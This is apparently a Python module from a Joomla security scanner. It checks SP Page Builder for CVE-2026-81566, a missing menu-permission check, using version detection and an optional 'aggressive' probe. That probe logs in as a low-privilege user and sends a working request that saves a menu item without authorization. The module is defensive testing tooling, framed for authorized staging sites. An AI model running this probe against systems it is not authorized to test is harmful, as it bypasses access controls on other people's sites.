from __future__ import annotations

import json
import re
import secrets
from typing import Any
from urllib.parse import urlencode

from ...core.http import (
    HttpClient,
    form_encode,
    is_transport_error,
    normalize_url,
    transport_error_detail,
)
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-81566"
NAME = "SP Page Builder missing com_menus permission on menu item save"
COMPONENT = "SP Page Builder"
AFFECTED_RULE = "SP Page Builder 6.0.0 through 6.9.x; fixed in 6.10.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
ADMIN_LOGIN = "/administrator/index.php"
ADD_TO_MENU = "/administrator/index.php?option=com_sppagebuilder&task=editor.addToMenu"
TOKEN_RE = re.compile(r'name="([a-f0-9]{32})" value="1"|"csrf\.token":"([a-f0-9]{32})"')
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("6.10.0")
    first_affected = parse_version_safe("6.0.0")
    if parsed is None or fixed is None or first_affected is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < first_affected:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("sppagebuilder", {})
    if not info.get("found"):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            detail="SP Page Builder was not detected through its public manifest or asset paths.",
            action="No action is required unless SP Page Builder is installed but hidden from public detection.",
        )

    version = info.get("version")
    status = classify_version(version)

    if status == "LIKELY_VULNERABLE":
        detail = (
            f"Detected SP Page Builder {version}. The editor add-to-menu route calls the com_menus item "
            "model directly, so a user with com_sppagebuilder manager access but no com_menus create/edit "
            "permission can save a menu item."
        )
        action = "Upgrade SP Page Builder to 6.10.0 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = (
            f"Detected SP Page Builder {version}, which checks "
            "SecurityHelper::canManageMenuItem() before saving a menu item."
        )
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "SP Page Builder was detected, but its version could not be determined."
        action = "Determine the installed SP Page Builder version and upgrade to 6.10.0 or newer."
        confidence = "MEDIUM"

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        component_version=version,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        detail=detail,
        action=action,
    )


def _token(body: str) -> str | None:
    match = TOKEN_RE.search(body)
    if not match:
        return None
    return match.group(1) or match.group(2)


def _admin_login(client: HttpClient, base: str, username: str, password: str, timeout: int) -> str | None:
    page = client.get(f"{base}{ADMIN_LOGIN}", timeout=timeout)
    if is_transport_error(page):
        return None
    login_token = _token(page.get("body") or "")
    if not login_token:
        return None
    response = client.request(
        f"{base}{ADMIN_LOGIN}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": BROWSER_UA},
        data=form_encode(
            {
                "username": username,
                "passwd": password,
                "option": "com_login",
                "task": "login",
                "return": "aW5kZXgucGhw",
                login_token: "1",
            }
        ),
        timeout=timeout,
    )
    if is_transport_error(response):
        return None
    page = client.get(f"{base}{ADMIN_LOGIN}", timeout=timeout)
    if is_transport_error(page):
        return None
    return _token(page.get("body") or "")


def _parse_json(body: str) -> dict[str, Any]:
    try:
        parsed = json.loads(body)
    except (json.JSONDecodeError, TypeError):
        return {}
    return parsed if isinstance(parsed, dict) else {}


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    page_id: int = 1,
    menu_type: str = "mainmenu",
    timeout: int = 15,
    proxy: str | None = None,
) -> Finding:
    """Save a menu item through the editor route with a non-super user.

    SP Page Builder 6.9.x and earlier call the com_menus item model directly
    from ``editor.addToMenu``; 6.10.0 adds
    ``SecurityHelper::canManageMenuItem()`` and returns 403.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=False,
            proof_url=f"{base}{ADMIN_LOGIN}",
            detail=(
                "The menu-save proof needs a Joomla user with core.manage on com_sppagebuilder but no "
                "core.create/core.edit on com_menus. Pass --aggressive-arg username=... password=... on an "
                "authorized staging site. Nothing was sent."
            ),
            action="Re-run with the lab manager credentials.",
        )

    client = HttpClient(timeout=timeout, proxy=proxy)
    token = _admin_login(client, base, username, password, timeout)
    if not token:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_CONFIRMED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{ADMIN_LOGIN}",
            detail="The login did not establish a session or expose a CSRF token; the menu probe was not attempted.",
            action="Verify the lab credentials and administrator login route.",
        )

    suffix = secrets.token_hex(4)
    title = f"ProofCMS 81566 {suffix}"
    alias = f"proofcms-81566-{suffix}"
    query = urlencode(
        {
            "_method": "PUT",
            "page_id": str(page_id),
            "menu_id": "0",
            "parent_id": "0",
            "menu_type": menu_type,
            "title": title,
            "alias": alias,
            "ordering": "0",
        }
    )
    response = client.request(
        f"{base}{ADD_TO_MENU}&{query}",
        method="PUT",
        headers={"User-Agent": BROWSER_UA, "X-CSRF-Token": token},
        timeout=timeout,
    )
    if is_transport_error(response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{ADD_TO_MENU}",
            detail=f"The menu-save request failed in transit ({transport_error_detail(response)}).",
            action="Retry when the target is reachable.",
        )

    status = response.get("status", 0)
    body_text = response.get("body") or ""
    parsed = _parse_json(body_text)
    success = bool(parsed.get("success") is True)

    home = client.get(f"{base}/index.php", timeout=timeout)
    home_body = "" if is_transport_error(home) else (home.get("body") or "")
    visible = title in home_body or alias in home_body

    evidence = {
        "title": title,
        "alias": alias,
        "response_status": status,
        "response_success": success,
        "menu_visible_on_home": visible,
    }

    if status == 200 and success:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED" if visible else "HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{ADD_TO_MENU}",
            evidence=evidence,
            detail=(
                "A user without com_menus create/edit permission saved a menu item through "
                "editor.addToMenu. The API returned success; the menu title "
                + ("is visible on the home page." if visible else "was not observed on the home page (template or cache).")
                + " 6.10.0 rejects the same request with JERROR_ALERTNOAUTHOR."
            ),
            action="Upgrade SP Page Builder to 6.10.0 or newer and review menu items created by non-super users.",
        )

    if status == 403 and "JERROR_ALERTNOAUTHOR" in body_text:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_AFFECTED",
            confidence="HIGH",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{ADD_TO_MENU}",
            evidence=evidence,
            detail="The menu-save request was rejected by the com_menus permission check (6.10.0 behaviour).",
            action="No action is required for this CVE.",
        )

    if status in (401, 403):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="BLOCKED_EXTERNAL",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{ADD_TO_MENU}",
            evidence=evidence,
            detail=(
                "The editor route rejected the request before the menu save. The user may lack "
                "core.manage on com_sppagebuilder, or the session/CSRF token was not accepted."
            ),
            action="Use a lab user with core.manage on com_sppagebuilder and no com_menus create/edit.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{ADD_TO_MENU}",
        evidence=evidence,
        detail="The menu-save response was neither a success nor the 6.10.0 permission rejection.",
        action="Review the response body and the lab user's ACL before retrying.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}{ADMIN_LOGIN}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="ERROR",
            confidence="LOW",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=url,
            detail=f"The administrator page could not be reached ({transport_error_detail(response)}).",
            action="Retry when the target is reachable.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="BLOCKED_EXTERNAL",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=url,
        detail="The administrator page is reachable; the menu-save payload was not sent in safe mode.",
        action="Use aggressive mode with manager credentials on an authorized staging site.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 15,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive

    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because SP Page Builder was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            page_id=int(aggressive_value(aggressive_args, aggressive_command, "page_id") or 1),
            menu_type=aggressive_value(aggressive_args, aggressive_command, "menu_type") or "mainmenu",
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result

    if exploit_mode != "safe":
        passive.detail += " This module supports safe (administrator reachability) and aggressive (menu item save) modes."
        return passive

    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["*"],
        "exploit_available": True,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "vulnerability_type": "Missing Authorization",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-19",
        "updated": "2026-11-19",
        "required_detectors": ["sppagebuilder"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-81566",
            "https://www.joomshaper.com/joomla-templates/sp-page-builder",
        ],
    }
